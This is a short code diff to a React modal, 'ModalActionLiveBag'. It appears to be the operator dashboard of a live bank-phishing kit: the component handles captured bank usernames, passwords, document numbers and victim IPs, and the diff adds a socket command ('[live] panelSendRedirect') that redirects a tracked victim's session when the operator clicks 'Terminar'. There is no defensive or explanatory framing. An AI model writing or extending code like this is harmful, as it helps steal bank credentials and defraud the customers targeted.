@@ -13,7 +13,10 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
   
   
   const {ip, liveData, urlPage, nroDocument, username, password, nameBank} = bag
-  
+  const finishRedirect = async({urlPage}) => {
+    await socket.emit('[live] panelSendRedirect', { ip, urlPage, redirectBag: true, nameBank  })
+    onClose()
+  }
   return (
       <Modal backdrop={'blur'} isOpen={isOpen} onClose={onClose} >
       <ModalContent>
@@ -37,7 +40,10 @@ export const  ModalActionLiveBag = ({bag, onClose, isOpen}) => {
                       >
 
                         <div className={pageNow ? 'flex justify-between bg-primary-400 p-2 rounded' : 'flex justify-between p-2'}>
-                          <span className={textPage === 'Terminar' ? 'bg-red-500 w-full p-2 text-center' : ''}>
+                          <span 
+                            onClick={() => finishRedirect({urlPage})}
+                            className={textPage === 'Terminar' ? 'bg-red-500 w-full p-2 text-center cursor-pointer' : ''}
+                          >
                             {textPage}
                           </span>
 
